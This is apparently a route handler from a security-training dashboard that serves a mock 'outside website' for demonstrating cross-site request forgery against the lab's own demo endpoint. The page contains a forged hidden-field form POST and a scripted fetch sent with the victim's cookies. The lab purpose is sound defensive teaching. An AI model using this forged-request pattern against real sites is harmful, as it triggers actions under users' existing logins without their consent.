import { randomBytes } from 'node:crypto';
import {
  demoEnabled,
  memberHost,
  primaryHost,
  attackHost,
  demoScheme,
} from '@/lib/demo-session';
export function GET(req: Request) {
  if (!demoEnabled() || req.headers.get('host') !== attackHost())
    return new Response(null, { status: 404 });
  const entry = new URL(req.url).searchParams.get('entry');
  if (!primaryHost(entry) && !memberHost(entry))
    return new Response(null, { status: 400 });
  const key=new URL(req.url).searchParams.get('probe');
  const target = demoScheme() + entry;
  const endpoint=target+'/api/demo/lab'+(key&&/^[a-f0-9]{40}$/.test(key)?'?probe='+key:'');
  const nonce = randomBytes(18).toString('base64');
  return new Response(
    `<!doctype html><html lang="en"><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Outside website · SecDash</title><style nonce="${nonce}">body{max-width:40rem;margin:12vh auto;padding:1.5rem;font:18px/1.6 system-ui;background:#101823;color:#fff}button{padding:.7rem;margin:.3rem}pre{white-space:pre-wrap}</style><h1>An outside website</h1><p>This page has a different origin from your dashboard. Try sending a refund request using your browser’s existing login. Return to your SecDash tab to inspect the ledger.</p><form action="${endpoint}" method="POST" target="_blank" rel="noopener"><input type="hidden" name="action" value="submit"><button>Send a cross-site form</button></form><button id="attack">Send a scripted request</button><pre id="result" aria-live="polite"></pre><script nonce="${nonce}">document.querySelector('#attack').onclick=async()=>{try{const r=await fetch(${JSON.stringify(endpoint)},{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'submit'})});document.querySelector('#result').textContent='Response readable: '+r.status}catch{document.querySelector('#result').textContent='The browser blocked access to the response. Check the ledger for any side effect.'}}</script></html>`,
    {
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'no-store',
        'Referrer-Policy': 'no-referrer',
        'Content-Security-Policy': `default-src 'none'; script-src 'nonce-${nonce}'; style-src 'nonce-${nonce}'; connect-src ${target}; form-action ${target}; frame-ancestors 'none'; base-uri 'none'`,
      },
    },
  );
}
